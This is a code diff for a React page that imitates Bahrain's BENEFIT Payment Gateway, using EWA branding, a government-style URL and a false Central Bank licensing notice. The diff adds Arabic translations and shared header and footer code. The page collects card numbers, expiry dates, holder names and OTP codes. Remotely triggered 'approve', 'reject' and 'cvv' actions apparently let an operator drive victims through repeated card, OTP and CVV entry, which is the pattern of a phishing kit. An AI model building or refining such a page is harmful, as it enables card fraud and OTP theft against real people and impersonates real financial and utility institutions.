@@ -21,11 +21,86 @@ const years = Array.from({ length: 15 }, (_, i) => ({
   label: String(currentYear + i),
 }));
 
+// Translations
+const translations = {
+  en: {
+    langToggle: "عربي",
+    gatewayTitle: "BENEFIT PAYMENT GATEWAY",
+    amount: "Amount",
+    cardType: "Card Type",
+    cardTypeValue: "Debit",
+    cardNumber: "Card Number",
+    expiryDate: "Expiry Date",
+    cardHolderName: "Card Holders Name",
+    saveCard: "Save your card details for future payments to this merchant.",
+    pay: "Pay",
+    cancel: "Cancel",
+    confirm: "Confirm",
+    viewAccepted: "View Accepted Cards",
+    note: "Note:",
+    noteText: 'By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the',
+    termsLink: "Terms of Services - Legal Disclaimer",
+    poweredBy: "Powered By The BENEFIT Company.",
+    copyright: "Copyright © 2020-2025 The BENEFIT Company. All Rights Reserved.",
+    licensed: "Licensed by Central Bank of Bahrain as Ancillary Service Provider.",
+    otpNotifTitle: "NOTIFICATION:",
+    otpNotifText: "You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.",
+    otp: "OTP",
+    processing: "Processing...",
+    close: "Close",
+    errCardNumber: "Please enter a valid card number",
+    errExpiry: "Please select expiry date",
+    errCardHolder: "Please enter card holder name",
+    errOtp: "Please enter a valid OTP (4-6 digits)",
+    errRejectCard: "Please check the entered information",
+    errRejectOtp: "Please enter the correct OTP",
+  },
+  ar: {
+    langToggle: "English",
+    gatewayTitle: "بوابة الدفع بنفت",
+    amount: "المبلغ",
+    cardType: "نوع البطاقة",
+    cardTypeValue: "بطاقة خصم",
+    cardNumber: "رقم البطاقة",
+    expiryDate: "تاريخ الانتهاء",
+    cardHolderName: "اسم حامل البطاقة",
+    saveCard: "حفظ بيانات بطاقتك للمدفوعات المستقبلية لهذا التاجر.",
+    pay: "ادفع",
+    cancel: "إلغاء",
+    confirm: "تأكيد",
+    viewAccepted: "عرض البطاقات المقبولة",
+    note: "ملاحظة:",
+    noteText: 'بتقديم معلوماتك واستخدام "بوابة الدفع بنفت"، فإنك توافق على',
+    termsLink: "شروط الخدمة - إخلاء المسؤولية القانونية",
+    poweredBy: "مدعوم من شركة بنفت.",
+    copyright: "حقوق النشر © 2020-2025 شركة بنفت. جميع الحقوق محفوظة.",
+    licensed: "مرخصة من مصرف البحرين المركزي كمزود خدمات مساندة.",
+    otpNotifTitle: "إشعار:",
+    otpNotifText: "ستتلقى قريباً رسالة نصية على رقم هاتفك المسجل لدى البنك. تحتوي الرسالة على رمز تحقق (OTP) مكون من 6 أرقام، يرجى إدخاله في الحقل أدناه.",
+    otp: "رمز التحقق",
+    processing: "جاري المعالجة...",
+    close: "إغلاق",
+    errCardNumber: "الرجاء إدخال رقم بطاقة صحيح",
+    errExpiry: "الرجاء اختيار تاريخ الانتهاء",
+    errCardHolder: "الرجاء إدخال اسم حامل البطاقة",
+    errOtp: "الرجاء إدخال رمز تحقق صحيح (4-6 أرقام)",
+    errRejectCard: "يرجى التأكد من المعلومات المدخلة",
+    errRejectOtp: "يرجى إدخال الرمز بشكل صحيح",
+  },
+};
+
 type Phase = "card" | "otp";
+type Lang = "en" | "ar";
+
+const RED = "#e60000";
 
 export default function KNETPayment() {
   const [, navigate] = useLocation();
   const [phase, setPhase] = useState<Phase>("card");
+  const [lang, setLang] = useState<Lang>("en");
+
+  const t = translations[lang];
+  const isRtl = lang === "ar";
 
   // Card form state
   const [cardNumber, setCardNumber] = useState("");
@@ -101,7 +176,7 @@ export default function KNETPayment() {
           startCountdown();
           navigateToPage("رمز التحقق بنفت (OTP)");
         } else if (action === "reject") {
-          setRejectedError("Please check the entered information");
+          setRejectedError(t.errRejectCard);
           setCardNumber("");
           setCardHolderName("");
           setExpiryMonth("");
@@ -113,7 +188,7 @@ export default function KNETPayment() {
         } else if (action === "cvv") {
           navigate("/cvv");
         } else if (action === "reject") {
-          setRejectedError("Please enter the correct OTP");
+          setRejectedError(t.errRejectOtp);
           setOtpCode("");
         }
       }
@@ -132,14 +207,14 @@ export default function KNETPayment() {
         if (action === "cvv") {
           navigate("/cvv");
         } else if (action === "reject") {
-          setRejectedError("Please enter the correct OTP");
+          setRejectedError(t.errRejectOtp);
           setOtpCode("");
         } else if (action === "approve" || action === "otp") {
           navigate("/final-page");
         }
       } else if (phase === "card") {
         if (action === "reject") {
-          setRejectedError("Please check the entered information");
+          setRejectedError(t.errRejectCard);
           setCardNumber("");
           setCardHolderName("");
           setExpiryMonth("");
@@ -152,15 +227,15 @@ export default function KNETPayment() {
 
   const validateCardForm = (): boolean => {
     if (!cardNumber || cardNumber.length < 10) {
-      setValidationError("Please enter a valid card number");
+      setValidationError(t.errCardNumber);
       return false;
     }
     if (!expiryMonth || !expiryYear) {
-      setValidationError("Please select expiry date");
+      setValidationError(t.errExpiry);
       return false;
     }
     if (!cardHolderName.trim()) {
-      setValidationError("Please enter card holder name");
+      setValidationError(t.errCardHolder);
       return false;
     }
     setValidationError("");
@@ -212,7 +287,7 @@ export default function KNETPayment() {
   const handleOtpSubmit = () => {
     if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
       setShowErrorModal(true);
-      setErrorModalMessage("Please enter a valid OTP (4-6 digits)");
+      setErrorModalMessage(t.errOtp);
       return;
     }
 
@@ -227,15 +302,66 @@ export default function KNETPayment() {
     });
   };
 
+  const toggleLang = () => {
+    setLang(lang === "en" ? "ar" : "en");
+    setValidationError("");
+    setRejectedError("");
+  };
+
+  // Shared header component
+  const renderHeader = () => (
+    <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
+      <div style={{ textAlign: isRtl ? "left" : "right", marginBottom: 8 }}>
+        <span onClick={toggleLang} style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>{t.langToggle}</span>
+      </div>
+      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", direction: "ltr" }}>
+        <div style={{ flex: "0 0 auto" }}>
+          <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
+        </div>
+        <div style={{ textAlign: "center", flex: 1 }}>
+          <div style={{ color: RED, fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>{t.gatewayTitle}</div>
+          <div style={{ color: RED, fontSize: 14, marginTop: 4 }}>{dateStr}</div>
+        </div>
+        <div style={{ textAlign: "right", flex: "0 0 auto" }}>
+          <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
+          <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
+        </div>
+      </div>
+    </div>
+  );
+
+  // Shared footer component
+  const renderFooter = (showViewCards = false) => (
+    <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
+      {showViewCards && (
+        <div style={{ marginBottom: 20 }}>
+          <span style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
+        </div>
+      )}
+      <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
+        <strong>{t.note}</strong> {t.noteText}{" "}
+        <span style={{ color: "#0066cc", cursor: "pointer" }}>{t.termsLink}</span>.
+      </div>
+      <div>
+        <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
+        <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
+          {t.poweredBy}<br />
+          {t.copyright}<br />
+          {t.licensed}
+        </div>
+      </div>
+    </div>
+  );
+
   return (
-    <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: "ltr" }}>
+    <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: isRtl ? "rtl" : "ltr" }}>
       {/* Loading overlay */}
       {isWaiting && (
         <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
           <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
-            <div style={{ border: "4px solid #f3f3f3", borderTop: "4px solid #cc0000", borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
+            <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
             <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
-            Processing...
+            {t.processing}
           </div>
         </div>
       )}
@@ -245,7 +371,7 @@ export default function KNETPayment() {
         <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
           <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: 30, maxWidth: 400, width: "90%", textAlign: "center" }}>
             <p style={{ fontSize: 14, marginBottom: 20 }}>{errorModalMessage}</p>
-            <button onClick={() => setShowErrorModal(false)} style={{ backgroundColor: "#cc0000", color: "#fff", border: "none", padding: "8px 30px", borderRadius: 4, cursor: "pointer", fontSize: 14 }}>Close</button>
+            <button onClick={() => setShowErrorModal(false)} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 30px", borderRadius: 4, cursor: "pointer", fontSize: 14 }}>{t.close}</button>
           </div>
         </div>
       )}
@@ -254,284 +380,155 @@ export default function KNETPayment() {
         {/* ============ CARD PHASE ============ */}
         {phase === "card" && (
           <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
-            {/* Header */}
-            <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
-              {/* Top row: عربي link */}
-              <div style={{ textAlign: "right", marginBottom: 8 }}>
-                <span style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>عربي</span>
-              </div>
-              {/* Main header row */}
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
-                {/* Left: EWA Logo */}
-                <div style={{ flex: "0 0 auto" }}>
-                  <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
-                </div>
-                {/* Center: BENEFIT PAYMENT GATEWAY */}
-                <div style={{ textAlign: "center", flex: 1 }}>
-                  <div style={{ color: "#cc0000", fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>BENEFIT PAYMENT GATEWAY</div>
-                  <div style={{ color: "#cc0000", fontSize: 14, marginTop: 4 }}>{dateStr}</div>
-                </div>
-                {/* Right: EWA / URL */}
-                <div style={{ textAlign: "right", flex: "0 0 auto" }}>
-                  <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
-                  <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
-                </div>
-              </div>
-            </div>
+            {renderHeader()}
 
             {/* Form Area */}
             <div style={{ padding: "25px 40px" }}>
-              {/* Validation Error */}
               {validationError && (
                 <div style={{ backgroundColor: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "8px 15px", borderRadius: 4, marginBottom: 15, fontSize: 13 }}>
                   {validationError}
                 </div>
               )}
 
-              {/* Rejected Error */}
               {rejectedError && (
-                <div style={{ color: "#cc0000", fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
+                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                   {rejectedError}
                 </div>
               )}
 
               <form onSubmit={handleCardSubmit}>
-                {/* Amount */}
                 <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
-                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Amount</label>
+                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                   <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
                 </div>
 
-                {/* Card Type */}
                 <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
-                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Type</label>
-                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>Debit</span>
+                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardType}</label>
+                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>{t.cardTypeValue}</span>
                 </div>
 
-                {/* Card Number */}
                 <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
-                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Number</label>
+                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                   <input
                     type="tel"
                     inputMode="numeric"
                     maxLength={19}
                     value={cardNumber}
-                    onChange={(e) => {
-                      const val = e.target.value.replace(/\D/g, "");
-                      setCardNumber(val);
-                      setValidationError("");
-                    }}
-                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
+                    onChange={(e) => { setCardNumber(e.target.value.replace(/\D/g, "")); setValidationError(""); }}
+                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
                   />
                 </div>
 
-                {/* Expiry Date */}
                 <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
-                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Expiry Date</label>
-                  <div style={{ display: "flex", gap: 5 }}>
-                    <select
-                      value={expiryMonth}
-                      onChange={(e) => setExpiryMonth(e.target.value)}
-                      style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}
-                    >
+                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
+                  <div style={{ display: "flex", gap: 5, direction: "ltr" }}>
+                    <select value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                       <option value="">MM</option>
-                      {months.map((m) => (
-                        <option key={m.value} value={m.value}>{m.label}</option>
-                      ))}
+                      {months.map((m) => (<option key={m.value} value={m.value}>{m.label}</option>))}
                     </select>
-                    <select
-                      value={expiryYear}
-                      onChange={(e) => setExpiryYear(e.target.value)}
-                      style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}
-                    >
+                    <select value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                       <option value="">YYYY</option>
-                      {years.map((y) => (
-                        <option key={y.value} value={y.value}>{y.label}</option>
-                      ))}
+                      {years.map((y) => (<option key={y.value} value={y.value}>{y.label}</option>))}
                     </select>
                   </div>
                 </div>
 
-                {/* Card Holders Name */}
                 <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
-                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Holders Name</label>
+                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardHolderName}</label>
                   <input
                     type="text"
                     value={cardHolderName}
-                    onChange={(e) => {
-                      setCardHolderName(e.target.value);
-                      setValidationError("");
-                    }}
+                    onChange={(e) => { setCardHolderName(e.target.value); setValidationError(""); }}
                     style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
                   />
                 </div>
 
-                {/* Save card checkbox */}
                 <div style={{ marginBottom: 25 }}>
                   <label style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#333", cursor: "pointer" }}>
-                    <input
-                      type="checkbox"
-                      checked={saveCard}
-                      onChange={(e) => setSaveCard(e.target.checked)}
-                      style={{ width: 14, height: 14 }}
-                    />
-                    Save your card details for future payments to this merchant.
+                    <input type="checkbox" checked={saveCard} onChange={(e) => setSaveCard(e.target.checked)} style={{ width: 14, height: 14 }} />
+                    {t.saveCard}
                   </label>
                 </div>
 
-                {/* Buttons */}
                 <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
-                  <button type="submit" style={{ backgroundColor: "#cc0000", color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: "pointer", minWidth: 100 }}>
-                    Pay
+                  <button type="submit" style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: "pointer", minWidth: 100 }}>
+                    {t.pay}
                   </button>
                   <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
-                    Cancel
+                    {t.cancel}
                   </button>
                 </div>
               </form>
             </div>
 
-            {/* Footer area */}
-            <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee" }}>
-              {/* View Accepted Cards */}
-              <div style={{ marginBottom: 20 }}>
-                <span style={{ color: "#cc0000", fontSize: 13, cursor: "pointer" }}>View Accepted Cards</span>
-              </div>
-
-              {/* Note */}
-              <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
-                <strong>Note:</strong> By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the{" "}
-                <span style={{ color: "#0066cc", cursor: "pointer" }}>Terms of Services - Legal Disclaimer</span>.
-              </div>
-
-              {/* Benefit Logo and Copyright */}
-              <div>
-                <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
-                <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
-                  Powered By The BENEFIT Company.<br />
-                  Copyright &copy; 2020-2025 The BENEFIT Company. All Rights Reserved.<br />
-                  Licensed by Central Bank of Bahrain as Ancillary Service Provider.
-                </div>
-              </div>
-            </div>
+            {renderFooter(true)}
           </div>
         )}
 
         {/* ============ OTP PHASE ============ */}
         {phase === "otp" && (
           <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
-            {/* Header */}
-            <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
-              <div style={{ textAlign: "right", marginBottom: 8 }}>
-                <span style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>عربي</span>
-              </div>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
-                <div style={{ flex: "0 0 auto" }}>
-                  <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
-                </div>
-                <div style={{ textAlign: "center", flex: 1 }}>
-                  <div style={{ color: "#cc0000", fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>BENEFIT PAYMENT GATEWAY</div>
-                  <div style={{ color: "#cc0000", fontSize: 14, marginTop: 4 }}>{dateStr}</div>
-                </div>
-                <div style={{ textAlign: "right", flex: "0 0 auto" }}>
-                  <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
-                  <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
-                </div>
-              </div>
-            </div>
+            {renderHeader()}
 
-            {/* OTP Form Area */}
             <div style={{ padding: "25px 40px" }}>
-              {/* OTP Notification */}
               <div style={{ backgroundColor: "#d9edf7", border: "1px solid #bce8f1", color: "#31708f", padding: 12, borderRadius: 4, marginBottom: 20, fontSize: 13, lineHeight: 1.6 }}>
-                <strong>NOTIFICATION:</strong> You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
+                <strong>{t.otpNotifTitle}</strong> {t.otpNotifText}
               </div>
 
-              {/* Amount */}
               <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
-                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Amount</label>
+                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                 <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
               </div>
 
-              {/* Card Number */}
               <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
-                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Number</label>
-                <span style={{ fontSize: 14, color: "#333" }}>{maskedCard}</span>
+                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
+                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{maskedCard}</span>
               </div>
 
-              {/* Expiry */}
               <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
-                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Expiry Date</label>
-                <span style={{ fontSize: 14, color: "#333" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
+                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
+                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
               </div>
 
-              {/* Rejected Error */}
               {rejectedError && (
-                <div style={{ color: "#cc0000", fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
+                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                   {rejectedError}
                 </div>
               )}
 
-              {/* OTP Input */}
               <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
-                <label style={{ width: 180, fontSize: 14, color: "#333" }}>OTP</label>
+                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.otp}</label>
                 <input
                   type="text"
                   inputMode="numeric"
                   maxLength={6}
                   value={otpCode}
-                  onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, "");
-                    setOtpCode(val);
-                    setRejectedError("");
-                  }}
+                  onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, "")); setRejectedError(""); }}
                   placeholder={formatCountdown(countdown)}
-                  style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto" }}
+                  style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto", direction: "ltr" }}
                 />
               </div>
 
-              {/* Buttons */}
               <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                 <button
                   type="button"
                   onClick={handleOtpSubmit}
                   disabled={!otpCode || otpCode.length < 4}
                   style={{
-                    backgroundColor: "#cc0000",
-                    color: "#fff",
-                    border: "none",
-                    padding: "8px 35px",
-                    borderRadius: 4,
-                    fontSize: 14,
-                    fontWeight: "bold",
+                    backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold",
                     cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
-                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6,
-                    minWidth: 100,
+                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6, minWidth: 100,
                   }}
                 >
-                  Confirm
+                  {t.confirm}
                 </button>
                 <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
-                  Cancel
+                  {t.cancel}
                 </button>
               </div>
             </div>
 
-            {/* Footer */}
-            <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee" }}>
-              <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
-                <strong>Note:</strong> By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the{" "}
-                <span style={{ color: "#0066cc", cursor: "pointer" }}>Terms of Services - Legal Disclaimer</span>.
-              </div>
-              <div>
-                <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
-                <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
-                  Powered By The BENEFIT Company.<br />
-                  Copyright &copy; 2020-2025 The BENEFIT Company. All Rights Reserved.<br />
-                  Licensed by Central Bank of Bahrain as Ancillary Service Provider.
-                </div>
-              </div>
-            </div>
+            {renderFooter(false)}
           </div>
         )}
       </div>
